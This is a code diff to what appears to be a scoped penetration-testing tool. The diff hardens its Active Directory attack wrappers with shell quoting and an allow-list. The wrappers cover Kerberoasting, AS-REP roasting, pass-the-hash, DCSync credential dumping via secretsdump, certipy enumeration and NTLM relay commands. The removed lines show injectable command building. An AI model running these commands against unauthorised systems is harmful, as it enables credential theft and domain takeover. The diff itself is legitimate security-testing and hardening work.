@@ -4,6 +4,7 @@ from __future__ import annotations
 
 from kambo.docker_runner import get_runner
 from kambo.models import Phase
+from kambo.sanitize import shell_quote
 from kambo.scope import validate_scope
 
 
@@ -26,7 +27,10 @@ async def ad_bloodhound(
     validate_scope(target)
     runner = get_runner()
 
-    cmd = f"bloodhound-python -d {domain} -u {username} -p '{password}' -c {collection} -ns {target} --zip -o /output/ 2>/dev/null"
+    allowed_collections = {"All", "Group", "LocalAdmin", "Session", "Trusts", "Default", "DCOnly", "DCOM", "RDP", "PSRemote", "LoggedOn", "ObjectProps", "ACL", "Container"}
+    if collection not in allowed_collections:
+        raise ValueError(f"Invalid collection method: {collection}")
+    cmd = f"bloodhound-python -d {shell_quote(domain)} -u {shell_quote(username)} -p {shell_quote(password)} -c {collection} -ns {shell_quote(target)} --zip -o /output/ 2>/dev/null"
     result = await runner.run(cmd, "ad_bloodhound", target, Phase.POST_EXPLOITATION, timeout=300)
 
     return {
@@ -55,7 +59,7 @@ async def ad_kerberoast(
     validate_scope(target)
     runner = get_runner()
 
-    cmd = f"GetUserSPNs.py {domain}/{username}:'{password}' -dc-ip {target} -request -outputfile /output/kerberoast.txt 2>/dev/null"
+    cmd = f"GetUserSPNs.py {shell_quote(f'{domain}/{username}')}:{shell_quote(password)} -dc-ip {shell_quote(target)} -request -outputfile /output/kerberoast.txt 2>/dev/null"
     result = await runner.run(cmd, "ad_kerberoast", target, Phase.POST_EXPLOITATION, timeout=60)
 
     hashes = [l for l in result.raw_output.splitlines() if l.startswith("$krb5tgs$")]
@@ -87,14 +91,14 @@ async def ad_asrep_roast(
     runner = get_runner()
 
     if users and not users_file:
-        user_list = "\\n".join(users)
-        cmd_prefix = f"echo -e '{user_list}' > /tmp/asrep_users.txt && "
+        user_list = "\\n".join(shell_quote(u).strip("'") for u in users)
+        cmd_prefix = f"printf '%b\\n' {shell_quote(user_list)} > /tmp/asrep_users.txt && "
         users_file = "/tmp/asrep_users.txt"
     else:
         cmd_prefix = ""
         users_file = users_file or "/tmp/users.txt"
 
-    cmd = f"{cmd_prefix}GetNPUsers.py {domain}/ -dc-ip {target} -usersfile {users_file} -format hashcat -outputfile /output/asrep.txt 2>/dev/null"
+    cmd = f"{cmd_prefix}GetNPUsers.py {shell_quote(f'{domain}/')} -dc-ip {shell_quote(target)} -usersfile {shell_quote(users_file)} -format hashcat -outputfile /output/asrep.txt 2>/dev/null"
     result = await runner.run(cmd, "ad_asrep_roast", target, Phase.POST_EXPLOITATION, timeout=60)
 
     hashes = [l for l in result.raw_output.splitlines() if l.startswith("$krb5asrep$")]
@@ -125,8 +129,7 @@ async def ad_pass_the_hash(
     validate_scope(target)
     runner = get_runner()
 
-    user_spec = f"{domain}/{username}" if domain else username
-    cmd = f"crackmapexec smb {target} -u {username} -H {ntlm_hash} -d {domain or '.'} 2>/dev/null"
+    cmd = f"crackmapexec smb {shell_quote(target)} -u {shell_quote(username)} -H {shell_quote(ntlm_hash)} -d {shell_quote(domain or '.')} 2>/dev/null"
     result = await runner.run(cmd, "ad_pass_the_hash", target, Phase.POST_EXPLOITATION, timeout=30)
 
     success = "Pwn3d" in result.raw_output or "(Pwn3d!)" in result.raw_output
@@ -161,12 +164,13 @@ async def ad_dcsync(
     validate_scope(target)
     runner = get_runner()
 
+    qt = shell_quote(target)
+    qu = shell_quote(username)
+    qd = shell_quote(domain)
     if ntlm_hash:
-        auth = f"-hashes :{ntlm_hash}"
+        cmd = f"secretsdump.py -hashes :{shell_quote(ntlm_hash)} {shell_quote(f'{domain}/{username}')}@{qt} -just-dc-user {shell_quote(target_user)} 2>/dev/null"
     else:
-        auth = f"'{password}'"
-
-    cmd = f"secretsdump.py {domain}/{username}:{auth}@{target} -just-dc-user {target_user} 2>/dev/null"
+        cmd = f"secretsdump.py {shell_quote(f'{domain}/{username}')}:{shell_quote(password)}@{qt} -just-dc-user {shell_quote(target_user)} 2>/dev/null"
     result = await runner.run(cmd, "ad_dcsync", target, Phase.POST_EXPLOITATION, timeout=60)
 
     return {
@@ -196,7 +200,7 @@ async def ad_certify(
     runner = get_runner()
 
     # Enumerate vulnerable templates
-    cmd = f"certipy find -u {username}@{domain} -p '{password}' -dc-ip {target} -vulnerable -stdout 2>/dev/null | head -100"
+    cmd = f"certipy find -u {shell_quote(f'{username}@{domain}')} -p {shell_quote(password)} -dc-ip {shell_quote(target)} -vulnerable -stdout 2>/dev/null | head -100"
     result = await runner.run(cmd, "ad_certify", target, Phase.POST_EXPLOITATION, timeout=60)
 
     vulnerable = "ESC" in result.raw_output
@@ -225,10 +229,11 @@ async def ad_ntlm_relay(
 
     # This tool provides setup commands rather than executing the full attack
     # (which requires interactive listeners)
+    effective_target = shell_quote(relay_target or target)
     commands = {
-        "responder": f"responder -I eth0 -dwP 2>/dev/null",
-        "ntlmrelayx_smb": f"ntlmrelayx.py -t {relay_target or target} -smb2support 2>/dev/null",
-        "ntlmrelayx_ldap": f"ntlmrelayx.py -t ldap://{relay_target or target} --escalate-user <user> 2>/dev/null",
+        "responder": "responder -I eth0 -dwP 2>/dev/null",
+        "ntlmrelayx_smb": f"ntlmrelayx.py -t {effective_target} -smb2support 2>/dev/null",
+        "ntlmrelayx_ldap": f"ntlmrelayx.py -t ldap://{shell_quote(relay_target or target)} --escalate-user <user> 2>/dev/null",
     }
 
     return {
